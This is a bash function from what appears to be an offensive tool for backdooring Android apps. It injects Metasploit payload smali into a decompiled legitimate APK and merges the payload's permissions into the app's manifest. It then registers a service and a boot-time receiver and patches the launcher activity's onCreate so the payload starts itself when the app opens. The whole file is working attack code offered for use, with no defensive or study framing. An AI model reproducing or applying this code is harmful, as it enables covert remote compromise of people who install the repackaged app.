#!/bin/bash

inject_payload() {
  local OUTPUT_DIR="./output"
  local DECOMPILED_APK_DIR="$OUTPUT_DIR/decompiled_apk"
  local PAYLOAD_APK="$OUTPUT_DIR/payload.apk"
  local PAYLOAD_SMALI_DIR="$OUTPUT_DIR/payload_smali"
  local TARGET_MANIFEST="$DECOMPILED_APK_DIR/AndroidManifest.xml"

  echo -e "${cyan}[DEBUG] Starting payload injection...${default}"

  # Preconditions
  if [ ! -f "$PAYLOAD_APK" ]; then
    echo -e "${red}[ERROR] Missing $PAYLOAD_APK. Generate payload first (menu 2).${default}"
    return 1
  fi
  if [ ! -f "$TARGET_MANIFEST" ]; then
    echo -e "${red}[ERROR] Missing decompiled APK at $DECOMPILED_APK_DIR. Decompile first (menu 1).${default}"
    return 1
  fi

  mkdir -p "$OUTPUT_DIR"

  # Decompile payload APK (force refresh)
  echo -e "${blue}[DEBUG] Decompiling payload APK...${default}"
  if apktool d "$PAYLOAD_APK" -o "$PAYLOAD_SMALI_DIR" --no-debug-info -f; then
    echo -e "${green}[LOG] Payload APK decompiled into $PAYLOAD_SMALI_DIR${default}"
  else
    echo -e "${red}[ERROR] Failed to decompile payload APK.${default}"
    return 1
  fi

  # Locate metasploit smali packages inside payload (smali, smali_classesN)
  echo -e "${blue}[DEBUG] Locating metasploit smali in payload...${default}"
  mapfile -t META_DIRS < <(find "$PAYLOAD_SMALI_DIR" -type d -path "*/smali*/com/metasploit*" 2>/dev/null)
  if [ ${#META_DIRS[@]} -eq 0 ]; then
    echo -e "${red}[ERROR] Could not find com/metasploit smali in payload.${default}"
    return 1
  fi

  # Copy metasploit package(s) into target smali tree
  for src_pkg in "${META_DIRS[@]}"; do
    rel_pkg="${src_pkg#*$PAYLOAD_SMALI_DIR/}"
    # Always copy into primary smali folder in target to keep things predictable
    dest_pkg="$DECOMPILED_APK_DIR/smali/${rel_pkg#*smali*/}"
    mkdir -p "$(dirname "$dest_pkg")"
    echo -e "${blue}[DEBUG] Injecting: $src_pkg -> $dest_pkg${default}"
    rsync -a "$src_pkg/" "$dest_pkg/" 2>/dev/null || cp -a "$src_pkg/." "$dest_pkg/"
  done
  echo -e "${green}[LOG] Smali injection complete.${default}"

  # Merge manifest: copy uses-permission and application components from payload
  local PAYLOAD_MANIFEST="$PAYLOAD_SMALI_DIR/AndroidManifest.xml"
  if [ ! -f "$PAYLOAD_MANIFEST" ]; then
    echo -e "${yellow}[WARN] Payload manifest not found; skipping manifest merge.${default}"
  else
    echo -e "${blue}[DEBUG] Merging manifest entries...${default}"

    # 1) Merge uses-permission (safe, self-closing)
    mapfile -t PERM_LINES < <(grep -oE '<uses-permission[^>]*/>' "$PAYLOAD_MANIFEST" | sed 's/^\s*//;s/\s*$//')
    for line in "${PERM_LINES[@]}"; do
      if ! grep -qF "$line" "$TARGET_MANIFEST"; then
        awk -v ins="$line" '{print; if (!done && $0 ~ /<manifest[ >]/) {print ins; done=1}}' "$TARGET_MANIFEST" > "$TARGET_MANIFEST.tmp" && mv "$TARGET_MANIFEST.tmp" "$TARGET_MANIFEST"
        echo -e "${green}[LOG] Added permission: $(echo "$line" | sed -n 's/.*name=\"\([^\"]*\)\".*/\1/p')${default}"
      else
        echo -e "${yellow}[LOG] Permission already present: $(echo "$line" | sed -n 's/.*name=\"\([^\"]*\)\".*/\1/p')${default}"
      fi
    done

    # 2) Insert minimal, well-formed payload components if missing
    # Main service
    if ! grep -q "com\.metasploit\.stage\.MainService" "$TARGET_MANIFEST"; then
      comp='<service android:name="com.metasploit.stage.MainService" android:enabled="true" android:exported="false" />'
      awk -v ins="$comp" '{if ($0 ~ /<\/application>/ && !done) {print ins; done=1} print}' "$TARGET_MANIFEST" > "$TARGET_MANIFEST.tmp" && mv "$TARGET_MANIFEST.tmp" "$TARGET_MANIFEST"
      echo -e "${green}[LOG] Added MainService component${default}"
    else
      echo -e "${yellow}[LOG] MainService already present${default}"
    fi

    # BOOT_COMPLETED receiver
    if ! grep -q "com\.metasploit\.stage\.MainBroadcastReceiver" "$TARGET_MANIFEST"; then
      comp='<receiver android:name="com.metasploit.stage.MainBroadcastReceiver" android:enabled="true" android:exported="true"><intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter></receiver>'
      awk -v ins="$comp" '{if ($0 ~ /<\/application>/ && !done) {print ins; done=1} print}' "$TARGET_MANIFEST" > "$TARGET_MANIFEST.tmp" && mv "$TARGET_MANIFEST.tmp" "$TARGET_MANIFEST"
      echo -e "${green}[LOG] Added MainBroadcastReceiver component${default}"
    else
      echo -e "${yellow}[LOG] MainBroadcastReceiver already present${default}"
    fi
  fi

  # Attempt to auto-start payload by patching the host launcher activity's onCreate
  echo -e "${blue}[DEBUG] Attempting to auto-start payload from host launcher onCreate...${default}"
  local PKG_NAME
  PKG_NAME=$(sed -n 's/.*package="\([^"]*\)".*/\1/p' "$TARGET_MANIFEST" | head -n1)
  local LAUNCHER
  LAUNCHER=$(awk '
    BEGIN{inAct=0; inIF=0; main=0; launch=0; name=""}
    /<activity[ \/>]/ {
      inAct=1; main=0; launch=0; name="";
      if (match($0, /android:name=\"([^\"]+)\"/, m)) name=m[1];
    }
    inAct && /<intent-filter>/ {inIF=1}
    inIF && /android\.intent\.action\.MAIN/ {main=1}
    inIF && /android\.intent\.category\.LAUNCHER/ {launch=1}
    inIF && /<\/intent-filter>/ {inIF=0}
    inAct && /<\/activity>/ { if (main && launch && name!="") { print name; exit } inAct=0 }
  ' "$TARGET_MANIFEST")
  if [ -n "$LAUNCHER" ]; then
    # Normalize class name to FQCN
    if [[ "$LAUNCHER" = .* ]]; then
      LAUNCHER_FQ="$PKG_NAME$LAUNCHER"
    elif [[ "$LAUNCHER" == *.* ]]; then
      LAUNCHER_FQ="$LAUNCHER"
    else
      LAUNCHER_FQ="$PKG_NAME.$LAUNCHER"
    fi

    # Find smali file in smali or smali_classes*
    local LAUNCHER_SMALI
    LAUNCHER_SMALI=$(find "$DECOMPILED_APK_DIR" -type f -path "*/smali*/$(echo "$LAUNCHER_FQ" | tr '.' '/')\.smali" | head -n1)
    if [ -n "$LAUNCHER_SMALI" ]; then
      echo -e "${blue}[DEBUG] Patching: $LAUNCHER_SMALI${default}"
      # Only patch if method uses .locals (skip .registers for safety)
      if grep -q "^\s*\.method\s\+.*onCreate(Landroid/os/Bundle;)V" "$LAUNCHER_SMALI" && grep -q "^\s*\.locals\s\+[0-9]\+" "$LAUNCHER_SMALI"; then
        # Ensure .locals >= 2
        awk 'BEGIN{patched=0}
          {
            if ($0 ~ /^\s*\.method\s+.*onCreate\(Landroid\/os\/Bundle;\)V/){ inmethod=1 }
            if (inmethod && $0 ~ /^\s*\.locals\s+[0-9]+/){
              split($0, a, /[ ]+/); n=a[length(a)];
              if (n+0 < 2) { sub(/\.locals\s+[0-9]+/, ".locals 2"); }
              print; getline;
              print; # keep the next line as-is
              print "    # cyrus:auto-start";
              print "    new-instance v0, Landroid/content/Intent;";
              print "    const-class v1, Lcom/metasploit/stage/MainService;";
              print "    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V";
              print "    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;";
              patched=1; inmethod=0
            } else { print }
          }
          END{ if (!patched) exit 1 }
        ' "$LAUNCHER_SMALI" > "$LAUNCHER_SMALI.tmp" && mv "$LAUNCHER_SMALI.tmp" "$LAUNCHER_SMALI"
        if [ $? -eq 0 ]; then
          echo -e "${green}[LOG] Auto-start hook inserted into launcher onCreate().${default}"
        else
          echo -e "${yellow}[LOG] Skipped auto-start: non-.locals or non-standard onCreate signature.${default}"
        fi
      else
        echo -e "${yellow}[LOG] Skipped auto-start: launcher onCreate() not found or uses .registers.${default}"
      fi
    else
      echo -e "${yellow}[LOG] Could not locate smali for launcher: $LAUNCHER_FQ${default}"
    fi
  else
    echo -e "${yellow}[LOG] Could not determine launcher activity; auto-start skipped.${default}"
  fi

  echo -e "${cyan}[DEBUG] Injection completed. You can now rebuild (menu 4).${default}"
}
